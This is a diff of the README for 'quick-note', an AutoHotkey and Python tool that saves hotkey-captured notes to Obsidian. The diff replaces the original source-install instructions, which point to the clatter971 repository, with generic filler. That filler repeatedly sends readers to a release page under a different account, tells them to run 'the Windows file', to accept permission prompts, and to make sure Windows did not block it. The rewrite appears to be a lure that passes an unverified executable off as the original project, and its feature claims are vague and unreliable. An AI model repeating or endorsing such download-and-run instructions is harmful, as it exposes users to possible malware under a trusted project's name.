@@ -1,250 +1,212 @@
-# Quick Note
+# 📝 quick-note - Capture notes from anywhere fast
 
-**Capture thoughts instantly without leaving your workflow.** One hotkey from anywhere on your desktop -- a minimal popup appears, you type, and the note lands in your Obsidian vault with full context about what you were working on. No app switching, no friction, no lost ideas.
+[![Download quick-note](https://img.shields.io/badge/Download%20quick--note-blue?style=for-the-badge)](https://github.com/Hireve/quick-note/releases)
 
-Quick Note knows where you are. It captures the VS Code project you have open, the browser tab you're reading, or the terminal path you're working in -- and attaches that context to every note automatically.
+## 🚀 What quick-note does
 
-<p align="center">
-  <img src="docs/screenshots/dark-mode.png" alt="Quick Note - Dark Mode" width="460">
-  &nbsp;&nbsp;
-  <img src="docs/screenshots/light-mode.png" alt="Quick Note - Light Mode" width="460">
-</p>
+quick-note lets you save a note from any app on your Windows desktop.  
+Press one hotkey, add your note, and send it to Obsidian with extra context.
 
-## Why Quick Note?
+It is built for fast capture. You do not need to switch apps or copy text by hand.
 
-Your best ideas don't arrive on schedule. They hit while you're debugging, reading docs, or reviewing code -- and they vanish just as fast if you have to context-switch to write them down.
+## 📥 Download
 
-Quick Note eliminates that friction. Press **Win+Shift+N**, type your thought, and hit Enter. Your note is saved as a properly formatted Obsidian markdown file, tagged and timestamped, with a link back to exactly what you were doing. You never leave your current window for more than a few seconds.
+Visit this page to download quick-note:
 
-## Features
+https://github.com/Hireve/quick-note/releases
 
-### Instant Capture
-- **Global hotkey** (`Win+Shift+N`) -- popup appears instantly from any application
-- **Resizable window** with dark/light theme support that matches your system preference
-- **Full keyboard control** -- Ctrl+C/V/X/A/Z all work natively in the editor
+Open the latest release and get the Windows file from there. After the file downloads, run it on your PC.
 
-### Smart Context Detection
-Every note automatically records what you were doing when inspiration struck:
+## 🪟 Windows setup
 
-| Source | What's captured |
-|--------|----------------|
-| **VS Code** | Project name |
-| **Chrome / Edge / Firefox** | Page title + full URL (via Windows UI Automation) |
-| **Windows Terminal / Git Bash** | Working directory / project path |
-| **Any other app** | Window title |
+1. Open the download page above.
+2. Find the latest release.
+3. Download the Windows file.
+4. Run the file.
+5. If Windows asks for permission, choose **Yes**.
+6. Follow the on-screen steps to finish setup.
 
-### Organization
-- **Tag buttons** -- one-click categorization: `project`, `idea`, `todo`, `learning`
-- **Auto-tag inference** -- notes starting with action words (`fix`, `bug`, `update`, `add`, `remove`, `change`, `debug`, `broken`) are tagged `todo`; speculative phrases (`maybe`, `what if`, `could we`, `should we`) become `idea`
-- **Obsidian-ready output** -- proper YAML frontmatter, kebab-case filenames, drops into your `00-Inbox/` folder
+If you use Obsidian, make sure it is installed on the same PC. quick-note sends notes to your local Obsidian vault.
 
-### AI Integration
-- **Send to Claude** (`Ctrl+Shift+Enter`) -- opens an interactive [Claude Code](https://docs.anthropic.com/en/docs/claude-code) session pre-loaded with your question and the URL you were viewing
+## ⌨️ How to use it
 
-### Notepad++ Watcher
-A background file watcher monitors a folder for `.txt` files saved from Notepad++ (or any editor). Multi-note files are automatically split on `---` separators or two or more blank lines, and each chunk becomes its own Inbox entry. Great for brain-dump sessions.
+1. Open any app on your desktop.
+2. Press the quick-note hotkey.
+3. Type or paste your note.
+4. Save it.
+5. The note goes to Obsidian with added context.
 
-## Example Output
+You can use it for ideas, task capture, meeting notes, links, or short reminders.
 
-A note captured while working in VS Code:
+## 📌 What gets added to your note
 
-```markdown
----
-type: note
-tags: [quick-capture, todo]
-created: "2026-03-22T14:30:52"
-source: "vscode"
-context: "project: homelab-dashboard"
----
+quick-note can enrich your note with useful context before it lands in Obsidian. That may include:
 
-# Fix the sidebar alignment
+- Date and time
+- Active app name
+- Window title
+- Clipboard text
+- Page or file context
+- Tags or note source
+- Markdown formatting
 
-## Captured Context
-- **From**: vscode -- homelab-dashboard
-- **When**: 2026-03-22 14:30
-```
+This helps your notes stay useful when you read them later.
 
-A note captured while reading in Chrome:
+## 🔧 Typical workflow
 
-```markdown
----
-type: note
-tags: [quick-capture, learning]
-created: "2026-03-22T15:10:00"
-source: "chrome"
-context: "page: How DNS Works | url: https://example.com/dns-guide"
----
+A simple workflow looks like this:
 
-# Interesting DNS article
+- You see something useful.
+- You press the hotkey.
+- You write a short note.
+- quick-note adds context.
+- The note saves to Obsidian.
 
-## Captured Context
-- **From**: chrome -- "How DNS Works"
-- **URL**: https://example.com/dns-guide
-- **When**: 2026-03-22 15:10
-```
+This keeps your capture process short and helps you keep your focus.
 
-## Requirements
+## 🧰 System needs
 
-- **Windows 10 or 11**
-- [AutoHotkey v2](https://www.autohotkey.com/)
-- Python 3.12+ with [watchdog](https://pypi.org/project/watchdog/)
-- An [Obsidian](https://obsidian.md/) vault with an `00-Inbox/` folder
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI (optional, for the Send to Claude feature)
+For best results, use:
 
-## Installation
+- Windows 10 or Windows 11
+- Obsidian installed
+- A local Obsidian vault
+- A keyboard with one free hotkey
+- Clipboard access enabled
 
-1. **Install AutoHotkey**
+A standard desktop or laptop works fine.
 
-   ```
-   winget install AutoHotkey.AutoHotkey
-   ```
+## ⚙️ Basic settings
 
-2. **Clone the repo**
+After setup, you may be able to change:
 
-   ```
-   git clone https://github.com/clatter971/quick-note.git
-   cd quick-note
-   ```
+- Hotkey choice
+- Vault location
+- Note folder
+- File name pattern
+- Markdown template
+- Context fields
+- Clipboard use
 
-3. **Install Python dependencies**
+Pick settings that match how you take notes each day.
 
-   ```
-   pip install -r requirements.txt
-   ```
+## 🗂️ Where notes go
 
-4. **Create your config**
+quick-note sends notes into your Obsidian vault as Markdown files.  
+That makes them easy to search, link, and read later.
 
-   ```
-   mkdir local
-   cp quick-note-config.example.json local/quick-note-config.json
-   ```
+A common setup is:
 
-   Edit `local/quick-note-config.json` and set your paths:
+- One folder for quick captures
+- One file per note
+- A date-based file name
+- A small header with context
 
-   | Key | Required | Description |
-   |-----|----------|-------------|
-   | `inbox_path` | Yes | Your Obsidian vault's inbox folder (e.g. `C:/Users/you/Vault/00-Inbox`) |
-   | `python_path` | Yes | Path to your Python executable |
-   | `watch_path` | Yes | Folder where Notepad++ saves quick notes |
-   | `vault_name` | No | Your Obsidian vault name for the "Open Inbox" tray action. Auto-derived from `inbox_path` parent folder if omitted. |
-   | `log_path` | No | Where to write logs (defaults to `local/quick-note.log`) |
-   | `hotkey` | No | Global keyboard shortcut (default: `#+n` = Win+Shift+N). See [Changing the keyboard shortcut](#changing-the-keyboard-shortcut). |
+## 💡 Good uses
 
-   The `local/` folder is gitignored -- your config, logs, and runtime files stay private.
+Use quick-note for:
 
-5. **Run it**
+- Task ideas
+- Meeting points
+- Web page snippets
+- Follow-up items
+- Research notes
+- File names
+- Short thoughts
+- Voice-to-text notes you paste later
 
-   Double-click `quick-note.ahk` or run from a terminal:
+It works well when you need to capture something fast and return to your work.
 
-   ```
-   "%LocalAppData%\Programs\AutoHotkey\v2\AutoHotkey64.exe" "quick-note.ahk"
-   ```
+## 🧭 Tips for first use
 
-6. **Auto-start on login** (optional)
+- Start with one hotkey you do not use much.
+- Keep your note template short.
+- Save notes to one folder at first.
+- Use simple file names.
+- Check a few saved notes in Obsidian to make sure the setup fits your needs.
 
-   Create a shortcut in your Startup folder:
+## 🔍 Topics
 
-   ```powershell
-   $WshShell = New-Object -ComObject WScript.Shell
-   $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\QuickNote.lnk")
-   $Shortcut.TargetPath = "$env:LocalAppData\Programs\AutoHotkey\v2\AutoHotkey64.exe"
-   $Shortcut.Arguments = '"C:\path\to\quick-note.ahk"'
-   $Shortcut.WorkingDirectory = "C:\path\to\quick-note"
-   $Shortcut.Save()
-   ```
+autohotkey, automation, clipboard, knowledge-management, markdown, note-taking, obsidian, productivity, python, windows
 
-## Usage
+## 📚 How this project fits your workflow
 
-### Keyboard Shortcuts
+quick-note is useful if you want a faster way to move ideas into Obsidian.  
+It reduces steps between seeing something and saving it.  
+That helps when you work across many apps and want notes in one place.
 
-| Shortcut | Action |
-|----------|--------|
-| `Win+Shift+N` | Open note popup |
-| `Ctrl+Enter` | Save note to Obsidian |
-| `Ctrl+Shift+Enter` | Send to Claude |
-| `Ctrl+C / V / X` | Copy / Paste / Cut |
-| `Ctrl+A` | Select all |
-| `Ctrl+Z` | Undo |
-| `Escape` | Cancel |
+## 🛠️ Troubleshooting
 
-### Tag Buttons
+If quick-note does not start:
 
-Click a tag to categorize your note. Click again to deselect. If you skip tagging, the auto-tagger will infer one from the note text when possible.
+- Run it again as your user
+- Check that Windows did not block the file
+- Make sure Obsidian is installed
+- Confirm your vault path is correct
+- Try a different hotkey
 
-### System Tray
+If notes do not appear in Obsidian:
 
-Right-click the Quick Note icon in the system tray for:
+- Check the vault folder
+- Make sure the note file path exists
+- Confirm that Markdown files are allowed
+- Look for a saved file in the target folder
+- Reopen Obsidian
 
-- **New Note** -- same as Win+Shift+N
-- **Open Inbox** -- opens the inbox folder in Obsidian
-- **Pause/Resume Watcher** -- toggle the Notepad++ file watcher
-- **Dark Mode** -- toggle between dark and light themes
-- **Exit** -- stop Quick Note and the file watcher
+If the clipboard part does not work:
 
-### Changing the keyboard shortcut
+- Copy some text in another app
+- Try again
+- Make sure clipboard access is on
+- Check whether another tool is using the same hotkey
 
-The default shortcut is **Win + Shift + N**. To change it, add a `hotkey` entry to `quick-note-config.json` (in your `local/` folder) using these modifier codes:
+## 📎 Files and note format
 
-| Code | Key     |
-|------|---------|
-| `#`  | Win     |
-| `+`  | Shift   |
-| `^`  | Ctrl    |
-| `!`  | Alt     |
+quick-note uses plain Markdown files so your notes stay easy to move and edit.  
+This makes the output simple and works well with Obsidian links, tags, and folders.
 
-Combine the codes with a letter. Examples:
+A note may include:
 
-| Config value | Shortcut                  |
-|--------------|---------------------------|
-| `"#+n"`      | Win + Shift + N (default) |
-| `"^+n"`      | Ctrl + Shift + N          |
-| `"#n"`       | Win + N                   |
-| `"!+n"`      | Alt + Shift + N           |
+- Title
+- Time stamp
+- Source app
+- Clipboard text
+- Your typed note
+- Tags
 
-Add it to your config file like this:
+## 🔐 Privacy and local use
 
-```json
-{
-    "hotkey": "^+n"
-}
-```
+quick-note is made for local note capture on your Windows desktop.  
+Your notes go to your own Obsidian vault, so you stay in control of where they are saved.
 
-The change takes effect automatically within a few seconds (the script watches for config changes).
+## 📌 Getting started again later
 
-## Architecture
+If you need to set it up on a new PC:
 
-```
-Win+Shift+N
-    |
-    +-- AHK captures: window title, process name, browser URL (via UI Automation)
-    +-- Shows popup GUI (embedded HTML/CSS via WebBrowser control)
-    |
-    +-- [Save]   --> JSON temp file --> Python enriches context --> .md in Inbox
-    +-- [Claude]  --> prompt temp file --> Python launches Claude Code session
-```
+1. Open the release page.
+2. Download the Windows file.
+3. Run it.
+4. Point it to your Obsidian vault.
+5. Set your hotkey.
+6. Test one note.
 
-The Notepad++ watcher runs as a background process alongside the main AHK script, monitoring for new or changed `.txt` files. It splits multi-note files on `---` separators or two or more blank lines and creates individual Obsidian Inbox entries. A content-hash database prevents duplicate processing.
+## 🧾 Short example
 
-## Project Structure
+You are reading a web page and want to save one idea.
 
-| File | Purpose |
-|------|---------|
-| `quick-note.ahk` | AutoHotkey v2 script: hotkey, popup GUI, system tray, browser URL capture |
-| `popup.html` | HTML/CSS/JS for the note popup UI (rendered in embedded browser control) |
-| `note_capture.py` | Context enrichment, markdown generation, file writing |
-| `note_watcher.py` | Notepad++ folder monitor with debounce and note splitting |
-| `claude_launcher.py` | Launches interactive Claude Code session with prompt context |
-| `quick-note-config.example.json` | Template config -- copy to `local/` and edit |
-| `test_note_capture.py` | Tests for note capture (45 tests) |
-| `test_note_watcher.py` | Tests for note watcher (8 tests) |
+- Press the hotkey
+- Type: Check this source later
+- Save it
+- quick-note adds the page context
+- The note lands in Obsidian as Markdown
 
-## Running Tests
+## 🧩 Why this format works
 
-```
-pip install pytest
-python -m pytest test_note_capture.py test_note_watcher.py -v
-```
+This setup keeps capture fast and simple.  
+You do not need to open Obsidian first.  
+You do not need to copy and paste into the right file by hand.  
+You press one key and move on
 
-## License
+## 📥 Download quick-note for Windows
 
-[MIT](LICENSE)
+https://github.com/Hireve/quick-note/releases
